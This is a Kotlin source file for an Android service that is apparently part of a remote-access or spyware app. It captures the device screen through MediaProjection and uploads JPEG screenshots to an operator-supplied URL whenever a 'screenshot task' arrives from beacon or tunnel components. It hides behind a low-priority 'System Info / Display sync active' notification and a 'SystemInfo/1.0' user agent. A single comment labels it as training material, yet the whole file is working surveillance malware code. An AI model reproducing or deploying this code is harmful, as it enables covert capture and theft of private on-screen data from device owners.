package com.securitydemo.systeminfo

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

/**
 * ScreenCaptureService — captures device screen using MediaProjection API.
 *
 * FOR CORPORATE SECURITY TRAINING ONLY.
 *
 * Flow:
 * 1. MainActivity requests MediaProjection permission (user sees system dialog)
 * 2. On approval, starts this service with the result intent
 * 3. Service creates a VirtualDisplay and captures frames via ImageReader
 * 4. When a screenshot task arrives, it grabs the latest frame, compresses to JPEG, uploads
 */
class ScreenCaptureService : Service() {

    companion object {
        private const val TAG = "ScreenCapture"
        private const val CHANNEL_ID = "screen_capture_channel"
        private const val NOTIFICATION_ID = 1002
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"

        @Volatile
        var instance: ScreenCaptureService? = null
            private set

        private val capturing = AtomicBoolean(false)

        fun start(context: Context, resultCode: Int, data: Intent) {
            val intent = Intent(context, ScreenCaptureService::class.java).apply {
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_RESULT_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        /**
         * Capture a screenshot and upload to server.
         * Called from TunnelService/BeaconWorker when screenshot task arrives.
         */
        fun captureAndUpload(quality: Int, uploadUrl: String): Map<String, Any> {
            val svc = instance ?: return mapOf(
                "type" to "task_response", "task" to "screenshot",
                "error" to "screen capture not initialized — user must grant permission",
                "timestamp" to System.currentTimeMillis()
            )
            return svc.doCapture(quality, uploadUrl)
        }
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null
    private var screenWidth = 1080
    private var screenHeight = 2400
    private var screenDensity = 420
    @Volatile
    private var latestImage: Image? = null
    @Volatile
    private var frameAvailable = false
    private val imageLock = Object()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        instance = this
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) return START_NOT_STICKY

        val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
        val resultData: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra(EXTRA_RESULT_DATA)
        }

        if (resultCode != Activity.RESULT_OK || resultData == null) {
            Log.e(TAG, "Invalid result code or data")
            stopSelf()
            return START_NOT_STICKY
        }

        // Get screen metrics
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels
        screenDensity = metrics.densityDpi

        // Use lower resolution to reduce bandwidth (half resolution)
        val captureWidth = screenWidth / 2
        val captureHeight = screenHeight / 2

        // Setup ImageReader
        imageReader = ImageReader.newInstance(captureWidth, captureHeight, PixelFormat.RGBA_8888, 2)

        // Handler thread for image callbacks
        handlerThread = HandlerThread("ScreenCapture").also { it.start() }
        handler = Handler(handlerThread!!.looper)

        imageReader!!.setOnImageAvailableListener({ reader ->
            // Don't consume the image here — let doCapture() acquire it directly.
            // Just track that a frame is available.
            synchronized(imageLock) {
                frameAvailable = true
            }
        }, handler)

        // Create MediaProjection
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
        mediaProjection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() {
                Log.d(TAG, "MediaProjection stopped")
                cleanup()
            }
        }, handler)

        // Create VirtualDisplay
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            captureWidth, captureHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface,
            null, handler
        )

        Log.d(TAG, "Screen capture started: ${captureWidth}x${captureHeight}")
        return START_STICKY
    }

    fun doCapture(quality: Int, uploadUrl: String): Map<String, Any> {
        if (capturing.getAndSet(true)) {
            return mapOf("type" to "task_response", "task" to "screenshot",
                "error" to "capture already in progress", "timestamp" to System.currentTimeMillis())
        }
        try {
            // Wait for a frame to become available (up to 3 seconds)
            var image: Image? = null
            for (i in 0 until 30) {
                val reader = imageReader
                if (reader != null) {
                    val acquired = try { reader.acquireLatestImage() } catch (e: Exception) { null }
                    if (acquired != null) {
                        image = acquired
                        break
                    }
                }
                Thread.sleep(100)
            }

            if (image == null) {
                return mapOf("type" to "task_response", "task" to "screenshot",
                    "error" to "no frame available after 3s wait", "timestamp" to System.currentTimeMillis())
            }

            val jpegBytes: ByteArray
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val imgWidth = image.width
                val imgHeight = image.height
                val rowPadding = rowStride - pixelStride * imgWidth

                val bitmapWidth = imgWidth + rowPadding / pixelStride
                val bitmap = Bitmap.createBitmap(
                    bitmapWidth,
                    imgHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()

                // Crop to actual width (remove row padding)
                val finalBitmap = if (bitmapWidth > imgWidth) {
                    Bitmap.createBitmap(bitmap, 0, 0, imgWidth, imgHeight).also {
                        bitmap.recycle()
                    }
                } else bitmap

                val stream = ByteArrayOutputStream()
                finalBitmap.compress(Bitmap.CompressFormat.JPEG, quality, stream)
                finalBitmap.recycle()
                jpegBytes = stream.toByteArray()
            } catch (e: Exception) {
                try { image.close() } catch (_: Exception) {}
                return mapOf("type" to "task_response", "task" to "screenshot",
                    "error" to "frame conversion failed: ${e.message}",
                    "timestamp" to System.currentTimeMillis())
            }

            // Upload
            try {
                val url = URL(uploadUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "image/jpeg")
                conn.setRequestProperty("User-Agent", "SystemInfo/1.0")
                conn.doOutput = true
                conn.connectTimeout = 15_000
                conn.readTimeout = 30_000
                conn.outputStream.use { it.write(jpegBytes); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Upload failed: ${e.message}")
                return mapOf("type" to "task_response", "task" to "screenshot",
                    "error" to "upload failed: ${e.message}",
                    "timestamp" to System.currentTimeMillis())
            }

            Log.d(TAG, "Screenshot captured & uploaded: ${jpegBytes.size} bytes")
            return mapOf(
                "type" to "task_response", "task" to "screenshot",
                "status" to "uploaded", "size" to jpegBytes.size,
                "width" to screenWidth, "height" to screenHeight,
                "timestamp" to System.currentTimeMillis()
            )
        } finally {
            capturing.set(false)
        }
    }

    private fun cleanup() {
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        mediaProjection?.stop()
        mediaProjection = null
        handlerThread?.quitSafely()
        handlerThread = null
        synchronized(imageLock) {
            frameAvailable = false
        }
    }

    override fun onDestroy() {
        cleanup()
        instance = null
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Screen Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Screen data synchronization"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Info")
            .setContentText("Display sync active")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
